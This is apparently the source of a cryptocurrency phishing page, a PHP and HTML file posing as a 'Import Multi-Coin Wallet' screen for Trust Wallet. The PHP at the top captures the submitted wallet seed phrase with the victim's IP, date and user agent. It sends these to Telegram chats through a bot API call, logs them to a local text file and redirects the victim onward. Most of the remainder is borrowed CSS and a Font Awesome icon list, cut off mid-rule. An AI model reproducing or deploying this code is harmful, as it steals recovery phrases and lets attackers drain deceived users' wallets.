<?php

include "id.php";
if(isset($_POST['seed'])){
 foreach($IdTelegram as $chatId) {
    $ip = getenv("REMOTE_ADDR");
        $date = date('m/d/Y h:i:s a', time());
    $message = "[+]━━━━━━❤️‍🔥PHARSEMASUK USDT TWT❤️‍🔥━━━━━━[+]\n[👤 Login] : ".$_POST['seed']."\n      [+]━━━━【💻 System】━━━[+]\n[🔍 IP INFO] : ".$ip."\n[⏰ TIME/DATE] : ".$date."\n[🌐 User-Agent] : ".$_SERVER['HTTP_USER_AGENT'];
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
$myfile = fopen("queen12.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: trustwallet.php");
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html data-cbscriptallow="true">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <title>Import Multi-Coin Wallet</title>
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous">
    <link rel="shortcut icon" href="faviconnn.png" type="image/x-icon">
    <style type="text/css">/*========== index.css ==========*/
      /* color */
      .color-orange {
      color: #f7861c; }
      .color-forest {
      color: #0a5448; }
      /* lib */
      .full-size {
      height: 100%;
      width: 100%; }
      .full-width {
      width: 100%; }
      .full-flex-height {
      display: flex;
      flex: 1 1 auto;
      flex-direction: column; }
      .full-height {
      height: 100%; }
      .flex-column {
      display: flex;
      flex-direction: column; }
      .space-between {
      justify-content: space-between; }
      .space-around {
      justify-content: space-around; }
      .flex-column-bottom {
      display: flex;
      flex-direction: column-reverse; }
      .flex-row {
      display: flex;
      flex-direction: row; }
      .flex-space-between {
      justify-content: space-between; }
      .flex-space-around {
      justify-content: space-around; }
      .flex-right {
      display: flex;
      flex-direction: row;
      justify-content: flex-end; }
      .flex-left {
      display: flex;
      flex-direction: row;
      justify-content: flex-start; }
      .flex-fixed {
      flex: none; }
      .flex-basis-auto {
      flex-basis: auto; }
      .flex-grow {
      flex: 1 1 auto; }
      .flex-wrap {
      flex-wrap: wrap; }
      .flex-center {
      display: flex;
      justify-content: center;
      align-items: center; }
      .flex-justify-center {
      justify-content: center; }
      .flex-align-center {
      align-items: center; }
      .flex-self-end {
      align-self: flex-end; }
      .flex-self-stretch {
      align-self: stretch; }
      .flex-vertical {
      flex-direction: column; }
      .z-bump {
      z-index: 1; }
      .select-none {
      cursor: inherit;
      -moz-user-select: none;
      -webkit-user-select: none;
      -ms-user-select: none;
      user-select: none; }
      .pointer {
      cursor: pointer; }
      .cursor-pointer {
      cursor: pointer;
      -webkit-transform-origin: center center;
      transform-origin: center center;
      transition: -webkit-transform 50ms ease-in-out;
      transition: transform 50ms ease-in-out;
      transition: transform 50ms ease-in-out, -webkit-transform 50ms ease-in-out; }
      .cursor-pointer:hover {
      -webkit-transform: scale(1.1);
      transform: scale(1.1); }
      .cursor-pointer:active {
      -webkit-transform: scale(0.95);
      transform: scale(0.95); }
      .cursor-disabled {
      cursor: not-allowed; }
      .margin-bottom-sml {
      margin-bottom: 20px; }
      .margin-bottom-med {
      margin-bottom: 40px; }
      .margin-right-left {
      margin: 0 20px; }
      .bold {
      font-weight: 500; }
      .text-transform-uppercase {
      text-transform: uppercase; }
      .font-small {
      font-size: 12px; }
      .font-medium {
      font-size: 1.2em; }
      hr.horizontal-line {
      display: block;
      height: 1px;
      border: 0;
      border-top: 1px solid #ccc;
      margin: 1em 0;
      padding: 0; }
      .hover-white:hover {
      background: #fff; }
      .red-dot {
      background: #e91550;
      color: #fff;
      border-radius: 10px; }
      .diamond {
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      background: #038789; }
      .hollow-diamond {
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      border: 3px solid #690496; }
      .golden-square {
      background: #ebb33f; }
      .pending-dot {
      background: #f00;
      left: 14px;
      top: 14px;
      color: #fff;
      border-radius: 10px;
      height: 20px;
      min-width: 20px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 4px;
      z-index: 1; }
      .keyring-label {
      z-index: 1;
      font-size: 8px;
      line-height: 8px;
      background: rgba(255, 255, 255, 0.4);
      color: #fff;
      border-radius: 10px;
      padding: 4px;
      text-align: center;
      height: 15px; }
      .ether-balance {
      display: flex;
      align-items: center; }
      .tabSection {
      min-width: 350px; }
      .menu-icon {
      display: inline-block;
      height: 12px;
      min-width: 12px;
      margin: 13px; }
      .ether-icon {
      background: #00a344;
      border-radius: 20px; }
      .testnet-icon {
      background: #2465e1; }
      .drop-menu-item {
      display: flex;
      align-items: center; }
      .invisible {
      visibility: hidden; }
      .one-line-concat {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .critical-error {
      text-align: center;
      margin-top: 20px;
      color: #f00; }
      /*
      Misc
      */
      .letter-spacey {
      letter-spacing: .1em; }
      .active {
      color: #909090; }
      .check {
      margin-left: 7px;
      color: #f7861c;
      flex: 1 0 auto;
      display: flex;
      justify-content: flex-end; }
      /*
      Generic
      */
      /* http://meyerweb.com/eric/tools/css/reset/
      v2.0 | 20110126
      License: none (public domain)
      */
      /*
      MetaMask design system imports
      The variables declared here should take precedence.
      They are included first because they will be used to replace bad variable names in itcss
      prior to it being fully removed from the system.
      */
      /* http://meyerweb.com/eric/tools/css/reset/
      v2.0 | 20110126
      License: none (public domain)
      */
      html,
      body,
      div,
      span,
      applet,
      object,
      iframe,
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
      p,
      blockquote,
      pre,
      a,
      abbr,
      acronym,
      address,
      big,
      cite,
      code,
      del,
      dfn,
      em,
      img,
      ins,
      kbd,
      q,
      s,
      samp,
      small,
      strike,
      strong,
      sub,
      sup,
      tt,
      var,
      b,
      u,
      i,
      center,
      dl,
      dt,
      dd,
      ol,
      ul,
      li,
      fieldset,
      form,
      label,
      legend,
      table,
      caption,
      tbody,
      tfoot,
      thead,
      tr,
      th,
      td,
      article,
      aside,
      canvas,
      details,
      embed,
      figure,
      figcaption,
      footer,
      header,
      hgroup,
      menu,
      nav,
      output,
      ruby,
      section,
      summary,
      time,
      mark,
      audio,
      video {
      margin: 0;
      padding: 0;
      border: 0;
      font-size: 100%;
      font-weight: inherit;
      font-style: inherit;
      font-variant: inherit;
      font-size: inherit;
      line-height: inherit;
      vertical-align: baseline; }
      /* HTML5 display-role reset for older browsers */
      /* stylelint-disable */
      article,
      aside,
      details,
      figcaption,
      figure,
      footer,
      header,
      hgroup,
      menu,
      nav,
      section {
      display: block; }
      ol,
      ul {
      list-style: none; }
      blockquote,
      q {
      quotes: none; }
      blockquote::before,
      blockquote::after,
      q::before,
      q::after {
      content: '';
      content: none; }
      table {
      border-collapse: collapse;
      border-spacing: 0; }
      button {
      border-style: none;
      cursor: pointer; }
      button::-moz-focus-inner {
      border: none; }
      /* stylelint-enable */
      /*
      Responsive Breakpoints
      */
      /**
      These colors are either deprecated or will move into colors.scss
      when approved for the design system
      **/
      /*
      Colors
      http://chir.ag/projects/name-that-color
      */
      /*!
      * Font Awesome Free 5.13.0 by @fontawesome - https://fontawesome.com
      * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
      */
      .fa,
      .fas,
      .far,
      .fal,
      .fad,
      .fab {
      -moz-osx-font-smoothing: grayscale;
      -webkit-font-smoothing: antialiased;
      display: inline-block;
      font-style: normal;
      font-variant: normal;
      text-rendering: auto;
      line-height: 1; }
      .fa-lg {
      font-size: 1.33333em;
      line-height: 0.75em;
      vertical-align: -.0667em; }
      .fa-xs {
      font-size: .75em; }
      .fa-sm {
      font-size: .875em; }
      .fa-1x {
      font-size: 1em; }
      .fa-2x {
      font-size: 2em; }
      .fa-3x {
      font-size: 3em; }
      .fa-4x {
      font-size: 4em; }
      .fa-5x {
      font-size: 5em; }
      .fa-6x {
      font-size: 6em; }
      .fa-7x {
      font-size: 7em; }
      .fa-8x {
      font-size: 8em; }
      .fa-9x {
      font-size: 9em; }
      .fa-10x {
      font-size: 10em; }
      .fa-fw {
      text-align: center;
      width: 1.25em; }
      .fa-ul {
      list-style-type: none;
      margin-left: 2.5em;
      padding-left: 0; }
      .fa-ul > li {
      position: relative; }
      .fa-li {
      left: -2em;
      position: absolute;
      text-align: center;
      width: 2em;
      line-height: inherit; }
      .fa-border {
      border: solid 0.08em #eee;
      border-radius: .1em;
      padding: .2em .25em .15em; }
      .fa-pull-left {
      float: left; }
      .fa-pull-right {
      float: right; }
      .fa.fa-pull-left,
      .fas.fa-pull-left,
      .far.fa-pull-left,
      .fal.fa-pull-left,
      .fab.fa-pull-left {
      margin-right: .3em; }
      .fa.fa-pull-right,
      .fas.fa-pull-right,
      .far.fa-pull-right,
      .fal.fa-pull-right,
      .fab.fa-pull-right {
      margin-left: .3em; }
      .fa-spin {
      -webkit-animation: fa-spin 2s infinite linear;
      animation: fa-spin 2s infinite linear; }
      .fa-pulse {
      -webkit-animation: fa-spin 1s infinite steps(8);
      animation: fa-spin 1s infinite steps(8); }
      @-webkit-keyframes fa-spin {
      0% {
      -webkit-transform: rotate(0deg);
      transform: rotate(0deg); }
      100% {
      -webkit-transform: rotate(360deg);
      transform: rotate(360deg); } }
      @keyframes fa-spin {
      0% {
      -webkit-transform: rotate(0deg);
      transform: rotate(0deg); }
      100% {
      -webkit-transform: rotate(360deg);
      transform: rotate(360deg); } }
      .fa-rotate-90 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg); }
      .fa-rotate-180 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .fa-rotate-270 {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
      -webkit-transform: rotate(270deg);
      transform: rotate(270deg); }
      .fa-flip-horizontal {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
      -webkit-transform: scale(-1, 1);
      transform: scale(-1, 1); }
      .fa-flip-vertical {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
      -webkit-transform: scale(1, -1);
      transform: scale(1, -1); }
      .fa-flip-both, .fa-flip-horizontal.fa-flip-vertical {
      -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
      -webkit-transform: scale(-1, -1);
      transform: scale(-1, -1); }
      :root .fa-rotate-90,
      :root .fa-rotate-180,
      :root .fa-rotate-270,
      :root .fa-flip-horizontal,
      :root .fa-flip-vertical,
      :root .fa-flip-both {
      -webkit-filter: none;
      filter: none; }
      .fa-stack {
      display: inline-block;
      height: 2em;
      line-height: 2em;
      position: relative;
      vertical-align: middle;
      width: 2.5em; }
      .fa-stack-1x,
      .fa-stack-2x {
      left: 0;
      position: absolute;
      text-align: center;
      width: 100%; }
      .fa-stack-1x {
      line-height: inherit; }
      .fa-stack-2x {
      font-size: 2em; }
      .fa-inverse {
      color: #fff; }
      /* Font Awesome uses the Unicode Private Use Area (PUA) to ensure screen
      readers do not read off random characters that represent icons */
      .fa-500px:before {
      content: "\f26e"; }
      .fa-accessible-icon:before {
      content: "\f368"; }
      .fa-accusoft:before {
      content: "\f369"; }
      .fa-acquisitions-incorporated:before {
      content: "\f6af"; }
      .fa-ad:before {
      content: "\f641"; }
      .fa-address-book:before {
      content: "\f2b9"; }
      .fa-address-card:before {
      content: "\f2bb"; }
      .fa-adjust:before {
      content: "\f042"; }
      .fa-adn:before {
      content: "\f170"; }
      .fa-adobe:before {
      content: "\f778"; }
      .fa-adversal:before {
      content: "\f36a"; }
      .fa-affiliatetheme:before {
      content: "\f36b"; }
      .fa-air-freshener:before {
      content: "\f5d0"; }
      .fa-airbnb:before {
      content: "\f834"; }
      .fa-algolia:before {
      content: "\f36c"; }
      .fa-align-center:before {
      content: "\f037"; }
      .fa-align-justify:before {
      content: "\f039"; }
      .fa-align-left:before {
      content: "\f036"; }
      .fa-align-right:before {
      content: "\f038"; }
      .fa-alipay:before {
      content: "\f642"; }
      .fa-allergies:before {
      content: "\f461"; }
      .fa-amazon:before {
      content: "\f270"; }
      .fa-amazon-pay:before {
      content: "\f42c"; }
      .fa-ambulance:before {
      content: "\f0f9"; }
      .fa-american-sign-language-interpreting:before {
      content: "\f2a3"; }
      .fa-amilia:before {
      content: "\f36d"; }
      .fa-anchor:before {
      content: "\f13d"; }
      .fa-android:before {
      content: "\f17b"; }
      .fa-angellist:before {
      content: "\f209"; }
      .fa-angle-double-down:before {
      content: "\f103"; }
      .fa-angle-double-left:before {
      content: "\f100"; }
      .fa-angle-double-right:before {
      content: "\f101"; }
      .fa-angle-double-up:before {
      content: "\f102"; }
      .fa-angle-down:before {
      content: "\f107"; }
      .fa-angle-left:before {
      content: "\f104"; }
      .fa-angle-right:before {
      content: "\f105"; }
      .fa-angle-up:before {
      content: "\f106"; }
      .fa-angry:before {
      content: "\f556"; }
      .fa-angrycreative:before {
      content: "\f36e"; }
      .fa-angular:before {
      content: "\f420"; }
      .fa-ankh:before {
      content: "\f644"; }
      .fa-app-store:before {
      content: "\f36f"; }
      .fa-app-store-ios:before {
      content: "\f370"; }
      .fa-apper:before {
      content: "\f371"; }
      .fa-apple:before {
      content: "\f179"; }
      .fa-apple-alt:before {
      content: "\f5d1"; }
      .fa-apple-pay:before {
      content: "\f415"; }
      .fa-archive:before {
      content: "\f187"; }
      .fa-archway:before {
      content: "\f557"; }
      .fa-arrow-alt-circle-down:before {
      content: "\f358"; }
      .fa-arrow-alt-circle-left:before {
      content: "\f359"; }
      .fa-arrow-alt-circle-right:before {
      content: "\f35a"; }
      .fa-arrow-alt-circle-up:before {
      content: "\f35b"; }
      .fa-arrow-circle-down:before {
      content: "\f0ab"; }
      .fa-arrow-circle-left:before {
      content: "\f0a8"; }
      .fa-arrow-circle-right:before {
      content: "\f0a9"; }
      .fa-arrow-circle-up:before {
      content: "\f0aa"; }
      .fa-arrow-down:before {
      content: "\f063"; }
      .fa-arrow-left:before {
      content: "\f060"; }
      .fa-arrow-right:before {
      content: "\f061"; }
      .fa-arrow-up:before {
      content: "\f062"; }
      .fa-arrows-alt:before {
      content: "\f0b2"; }
      .fa-arrows-alt-h:before {
      content: "\f337"; }
      .fa-arrows-alt-v:before {
      content: "\f338"; }
      .fa-artstation:before {
      content: "\f77a"; }
      .fa-assistive-listening-systems:before {
      content: "\f2a2"; }
      .fa-asterisk:before {
      content: "\f069"; }
      .fa-asymmetrik:before {
      content: "\f372"; }
      .fa-at:before {
      content: "\f1fa"; }
      .fa-atlas:before {
      content: "\f558"; }
      .fa-atlassian:before {
      content: "\f77b"; }
      .fa-atom:before {
      content: "\f5d2"; }
      .fa-audible:before {
      content: "\f373"; }
      .fa-audio-description:before {
      content: "\f29e"; }
      .fa-autoprefixer:before {
      content: "\f41c"; }
      .fa-avianex:before {
      content: "\f374"; }
      .fa-aviato:before {
      content: "\f421"; }
      .fa-award:before {
      content: "\f559"; }
      .fa-aws:before {
      content: "\f375"; }
      .fa-baby:before {
      content: "\f77c"; }
      .fa-baby-carriage:before {
      content: "\f77d"; }
      .fa-backspace:before {
      content: "\f55a"; }
      .fa-backward:before {
      content: "\f04a"; }
      .fa-bacon:before {
      content: "\f7e5"; }
      .fa-bahai:before {
      content: "\f666"; }
      .fa-balance-scale:before {
      content: "\f24e"; }
      .fa-balance-scale-left:before {
      content: "\f515"; }
      .fa-balance-scale-right:before {
      content: "\f516"; }
      .fa-ban:before {
      content: "\f05e"; }
      .fa-band-aid:before {
      content: "\f462"; }
      .fa-bandcamp:before {
      content: "\f2d5"; }
      .fa-barcode:before {
      content: "\f02a"; }
      .fa-bars:before {
      content: "\f0c9"; }
      .fa-baseball-ball:before {
      content: "\f433"; }
      .fa-basketball-ball:before {
      content: "\f434"; }
      .fa-bath:before {
      content: "\f2cd"; }
      .fa-battery-empty:before {
      content: "\f244"; }
      .fa-battery-full:before {
      content: "\f240"; }
      .fa-battery-half:before {
      content: "\f242"; }
      .fa-battery-quarter:before {
      content: "\f243"; }
      .fa-battery-three-quarters:before {
      content: "\f241"; }
      .fa-battle-net:before {
      content: "\f835"; }
      .fa-bed:before {
      content: "\f236"; }
      .fa-beer:before {
      content: "\f0fc"; }
      .fa-behance:before {
      content: "\f1b4"; }
      .fa-behance-square:before {
      content: "\f1b5"; }
      .fa-bell:before {
      content: "\f0f3"; }
      .fa-bell-slash:before {
      content: "\f1f6"; }
      .fa-bezier-curve:before {
      content: "\f55b"; }
      .fa-bible:before {
      content: "\f647"; }
      .fa-bicycle:before {
      content: "\f206"; }
      .fa-biking:before {
      content: "\f84a"; }
      .fa-bimobject:before {
      content: "\f378"; }
      .fa-binoculars:before {
      content: "\f1e5"; }
      .fa-biohazard:before {
      content: "\f780"; }
      .fa-birthday-cake:before {
      content: "\f1fd"; }
      .fa-bitbucket:before {
      content: "\f171"; }
      .fa-bitcoin:before {
      content: "\f379"; }
      .fa-bity:before {
      content: "\f37a"; }
      .fa-black-tie:before {
      content: "\f27e"; }
      .fa-blackberry:before {
      content: "\f37b"; }
      .fa-blender:before {
      content: "\f517"; }
      .fa-blender-phone:before {
      content: "\f6b6"; }
      .fa-blind:before {
      content: "\f29d"; }
      .fa-blog:before {
      content: "\f781"; }
      .fa-blogger:before {
      content: "\f37c"; }
      .fa-blogger-b:before {
      content: "\f37d"; }
      .fa-bluetooth:before {
      content: "\f293"; }
      .fa-bluetooth-b:before {
      content: "\f294"; }
      .fa-bold:before {
      content: "\f032"; }
      .fa-bolt:before {
      content: "\f0e7"; }
      .fa-bomb:before {
      content: "\f1e2"; }
      .fa-bone:before {
      content: "\f5d7"; }
      .fa-bong:before {
      content: "\f55c"; }
      .fa-book:before {
      content: "\f02d"; }
      .fa-book-dead:before {
      content: "\f6b7"; }
      .fa-book-medical:before {
      content: "\f7e6"; }
      .fa-book-open:before {
      content: "\f518"; }
      .fa-book-reader:before {
      content: "\f5da"; }
      .fa-bookmark:before {
      content: "\f02e"; }
      .fa-bootstrap:before {
      content: "\f836"; }
      .fa-border-all:before {
      content: "\f84c"; }
      .fa-border-none:before {
      content: "\f850"; }
      .fa-border-style:before {
      content: "\f853"; }
      .fa-bowling-ball:before {
      content: "\f436"; }
      .fa-box:before {
      content: "\f466"; }
      .fa-box-open:before {
      content: "\f49e"; }
      .fa-box-tissue:before {
      content: "\f95b"; }
      .fa-boxes:before {
      content: "\f468"; }
      .fa-braille:before {
      content: "\f2a1"; }
      .fa-brain:before {
      content: "\f5dc"; }
      .fa-bread-slice:before {
      content: "\f7ec"; }
      .fa-briefcase:before {
      content: "\f0b1"; }
      .fa-briefcase-medical:before {
      content: "\f469"; }
      .fa-broadcast-tower:before {
      content: "\f519"; }
      .fa-broom:before {
      content: "\f51a"; }
      .fa-brush:before {
      content: "\f55d"; }
      .fa-btc:before {
      content: "\f15a"; }
      .fa-buffer:before {
      content: "\f837"; }
      .fa-bug:before {
      content: "\f188"; }
      .fa-building:before {
      content: "\f1ad"; }
      .fa-bullhorn:before {
      content: "\f0a1"; }
      .fa-bullseye:before {
      content: "\f140"; }
      .fa-burn:before {
      content: "\f46a"; }
      .fa-buromobelexperte:before {
      content: "\f37f"; }
      .fa-bus:before {
      content: "\f207"; }
      .fa-bus-alt:before {
      content: "\f55e"; }
      .fa-business-time:before {
      content: "\f64a"; }
      .fa-buy-n-large:before {
      content: "\f8a6"; }
      .fa-buysellads:before {
      content: "\f20d"; }
      .fa-calculator:before {
      content: "\f1ec"; }
      .fa-calendar:before {
      content: "\f133"; }
      .fa-calendar-alt:before {
      content: "\f073"; }
      .fa-calendar-check:before {
      content: "\f274"; }
      .fa-calendar-day:before {
      content: "\f783"; }
      .fa-calendar-minus:before {
      content: "\f272"; }
      .fa-calendar-plus:before {
      content: "\f271"; }
      .fa-calendar-times:before {
      content: "\f273"; }
      .fa-calendar-week:before {
      content: "\f784"; }
      .fa-camera:before {
      content: "\f030"; }
      .fa-camera-retro:before {
      content: "\f083"; }
      .fa-campground:before {
      content: "\f6bb"; }
      .fa-canadian-maple-leaf:before {
      content: "\f785"; }
      .fa-candy-cane:before {
      content: "\f786"; }
      .fa-cannabis:before {
      content: "\f55f"; }
      .fa-capsules:before {
      content: "\f46b"; }
      .fa-car:before {
      content: "\f1b9"; }
      .fa-car-alt:before {
      content: "\f5de"; }
      .fa-car-battery:before {
      content: "\f5df"; }
      .fa-car-crash:before {
      content: "\f5e1"; }
      .fa-car-side:before {
      content: "\f5e4"; }
      .fa-caravan:before {
      content: "\f8ff"; }
      .fa-caret-down:before {
      content: "\f0d7"; }
      .fa-caret-left:before {
      content: "\f0d9"; }
      .fa-caret-right:before {
      content: "\f0da"; }
      .fa-caret-square-down:before {
      content: "\f150"; }
      .fa-caret-square-left:before {
      content: "\f191"; }
      .fa-caret-square-right:before {
      content: "\f152"; }
      .fa-caret-square-up:before {
      content: "\f151"; }
      .fa-caret-up:before {
      content: "\f0d8"; }
      .fa-carrot:before {
      content: "\f787"; }
      .fa-cart-arrow-down:before {
      content: "\f218"; }
      .fa-cart-plus:before {
      content: "\f217"; }
      .fa-cash-register:before {
      content: "\f788"; }
      .fa-cat:before {
      content: "\f6be"; }
      .fa-cc-amazon-pay:before {
      content: "\f42d"; }
      .fa-cc-amex:before {
      content: "\f1f3"; }
      .fa-cc-apple-pay:before {
      content: "\f416"; }
      .fa-cc-diners-club:before {
      content: "\f24c"; }
      .fa-cc-discover:before {
      content: "\f1f2"; }
      .fa-cc-jcb:before {
      content: "\f24b"; }
      .fa-cc-mastercard:before {
      content: "\f1f1"; }
      .fa-cc-paypal:before {
      content: "\f1f4"; }
      .fa-cc-stripe:before {
      content: "\f1f5"; }
      .fa-cc-visa:before {
      content: "\f1f0"; }
      .fa-centercode:before {
      content: "\f380"; }
      .fa-centos:before {
      content: "\f789"; }
      .fa-certificate:before {
      content: "\f0a3"; }
      .fa-chair:before {
      content: "\f6c0"; }
      .fa-chalkboard:before {
      content: "\f51b"; }
      .fa-chalkboard-teacher:before {
      content: "\f51c"; }
      .fa-charging-station:before {
      content: "\f5e7"; }
      .fa-chart-area:before {
      content: "\f1fe"; }
      .fa-chart-bar:before {
      content: "\f080"; }
      .fa-chart-line:before {
      content: "\f201"; }
      .fa-chart-pie:before {
      content: "\f200"; }
      .fa-check:before {
      content: "\f00c"; }
      .fa-check-circle:before {
      content: "\f058"; }
      .fa-check-double:before {
      content: "\f560"; }
      .fa-check-square:before {
      content: "\f14a"; }
      .fa-cheese:before {
      content: "\f7ef"; }
      .fa-chess:before {
      content: "\f439"; }
      .fa-chess-bishop:before {
      content: "\f43a"; }
      .fa-chess-board:before {
      content: "\f43c"; }
      .fa-chess-king:before {
      content: "\f43f"; }
      .fa-chess-knight:before {
      content: "\f441"; }
      .fa-chess-pawn:before {
      content: "\f443"; }
      .fa-chess-queen:before {
      content: "\f445"; }
      .fa-chess-rook:before {
      content: "\f447"; }
      .fa-chevron-circle-down:before {
      content: "\f13a"; }
      .fa-chevron-circle-left:before {
      content: "\f137"; }
      .fa-chevron-circle-right:before {
      content: "\f138"; }
      .fa-chevron-circle-up:before {
      content: "\f139"; }
      .fa-chevron-down:before {
      content: "\f078"; }
      .fa-chevron-left:before {
      content: "\f053"; }
      .fa-chevron-right:before {
      content: "\f054"; }
      .fa-chevron-up:before {
      content: "\f077"; }
      .fa-child:before {
      content: "\f1ae"; }
      .fa-chrome:before {
      content: "\f268"; }
      .fa-chromecast:before {
      content: "\f838"; }
      .fa-church:before {
      content: "\f51d"; }
      .fa-circle:before {
      content: "\f111"; }
      .fa-circle-notch:before {
      content: "\f1ce"; }
      .fa-city:before {
      content: "\f64f"; }
      .fa-clinic-medical:before {
      content: "\f7f2"; }
      .fa-clipboard:before {
      content: "\f328"; }
      .fa-clipboard-check:before {
      content: "\f46c"; }
      .fa-clipboard-list:before {
      content: "\f46d"; }
      .fa-clock:before {
      content: "\f017"; }
      .fa-clone:before {
      content: "\f24d"; }
      .fa-closed-captioning:before {
      content: "\f20a"; }
      .fa-cloud:before {
      content: "\f0c2"; }
      .fa-cloud-download-alt:before {
      content: "\f381"; }
      .fa-cloud-meatball:before {
      content: "\f73b"; }
      .fa-cloud-moon:before {
      content: "\f6c3"; }
      .fa-cloud-moon-rain:before {
      content: "\f73c"; }
      .fa-cloud-rain:before {
      content: "\f73d"; }
      .fa-cloud-showers-heavy:before {
      content: "\f740"; }
      .fa-cloud-sun:before {
      content: "\f6c4"; }
      .fa-cloud-sun-rain:before {
      content: "\f743"; }
      .fa-cloud-upload-alt:before {
      content: "\f382"; }
      .fa-cloudscale:before {
      content: "\f383"; }
      .fa-cloudsmith:before {
      content: "\f384"; }
      .fa-cloudversify:before {
      content: "\f385"; }
      .fa-cocktail:before {
      content: "\f561"; }
      .fa-code:before {
      content: "\f121"; }
      .fa-code-branch:before {
      content: "\f126"; }
      .fa-codepen:before {
      content: "\f1cb"; }
      .fa-codiepie:before {
      content: "\f284"; }
      .fa-coffee:before {
      content: "\f0f4"; }
      .fa-cog:before {
      content: "\f013"; }
      .fa-cogs:before {
      content: "\f085"; }
      .fa-coins:before {
      content: "\f51e"; }
      .fa-columns:before {
      content: "\f0db"; }
      .fa-comment:before {
      content: "\f075"; }
      .fa-comment-alt:before {
      content: "\f27a"; }
      .fa-comment-dollar:before {
      content: "\f651"; }
      .fa-comment-dots:before {
      content: "\f4ad"; }
      .fa-comment-medical:before {
      content: "\f7f5"; }
      .fa-comment-slash:before {
      content: "\f4b3"; }
      .fa-comments:before {
      content: "\f086"; }
      .fa-comments-dollar:before {
      content: "\f653"; }
      .fa-compact-disc:before {
      content: "\f51f"; }
      .fa-compass:before {
      content: "\f14e"; }
      .fa-compress:before {
      content: "\f066"; }
      .fa-compress-alt:before {
      content: "\f422"; }
      .fa-compress-arrows-alt:before {
      content: "\f78c"; }
      .fa-concierge-bell:before {
      content: "\f562"; }
      .fa-confluence:before {
      content: "\f78d"; }
      .fa-connectdevelop:before {
      content: "\f20e"; }
      .fa-contao:before {
      content: "\f26d"; }
      .fa-cookie:before {
      content: "\f563"; }
      .fa-cookie-bite:before {
      content: "\f564"; }
      .fa-copy:before {
      content: "\f0c5"; }
      .fa-copyright:before {
      content: "\f1f9"; }
      .fa-cotton-bureau:before {
      content: "\f89e"; }
      .fa-couch:before {
      content: "\f4b8"; }
      .fa-cpanel:before {
      content: "\f388"; }
      .fa-creative-commons:before {
      content: "\f25e"; }
      .fa-creative-commons-by:before {
      content: "\f4e7"; }
      .fa-creative-commons-nc:before {
      content: "\f4e8"; }
      .fa-creative-commons-nc-eu:before {
      content: "\f4e9"; }
      .fa-creative-commons-nc-jp:before {
      content: "\f4ea"; }
      .fa-creative-commons-nd:before {
      content: "\f4eb"; }
      .fa-creative-commons-pd:before {
      content: "\f4ec"; }
      .fa-creative-commons-pd-alt:before {
      content: "\f4ed"; }
      .fa-creative-commons-remix:before {
      content: "\f4ee"; }
      .fa-creative-commons-sa:before {
      content: "\f4ef"; }
      .fa-creative-commons-sampling:before {
      content: "\f4f0"; }
      .fa-creative-commons-sampling-plus:before {
      content: "\f4f1"; }
      .fa-creative-commons-share:before {
      content: "\f4f2"; }
      .fa-creative-commons-zero:before {
      content: "\f4f3"; }
      .fa-credit-card:before {
      content: "\f09d"; }
      .fa-critical-role:before {
      content: "\f6c9"; }
      .fa-crop:before {
      content: "\f125"; }
      .fa-crop-alt:before {
      content: "\f565"; }
      .fa-cross:before {
      content: "\f654"; }
      .fa-crosshairs:before {
      content: "\f05b"; }
      .fa-crow:before {
      content: "\f520"; }
      .fa-crown:before {
      content: "\f521"; }
      .fa-crutch:before {
      content: "\f7f7"; }
      .fa-css3:before {
      content: "\f13c"; }
      .fa-css3-alt:before {
      content: "\f38b"; }
      .fa-cube:before {
      content: "\f1b2"; }
      .fa-cubes:before {
      content: "\f1b3"; }
      .fa-cut:before {
      content: "\f0c4"; }
      .fa-cuttlefish:before {
      content: "\f38c"; }
      .fa-d-and-d:before {
      content: "\f38d"; }
      .fa-d-and-d-beyond:before {
      content: "\f6ca"; }
      .fa-dailymotion:before {
      content: "\f952"; }
      .fa-dashcube:before {
      content: "\f210"; }
      .fa-database:before {
      content: "\f1c0"; }
      .fa-deaf:before {
      content: "\f2a4"; }
      .fa-delicious:before {
      content: "\f1a5"; }
      .fa-democrat:before {
      content: "\f747"; }
      .fa-deploydog:before {
      content: "\f38e"; }
      .fa-deskpro:before {
      content: "\f38f"; }
      .fa-desktop:before {
      content: "\f108"; }
      .fa-dev:before {
      content: "\f6cc"; }
      .fa-deviantart:before {
      content: "\f1bd"; }
      .fa-dharmachakra:before {
      content: "\f655"; }
      .fa-dhl:before {
      content: "\f790"; }
      .fa-diagnoses:before {
      content: "\f470"; }
      .fa-diaspora:before {
      content: "\f791"; }
      .fa-dice:before {
      content: "\f522"; }
      .fa-dice-d20:before {
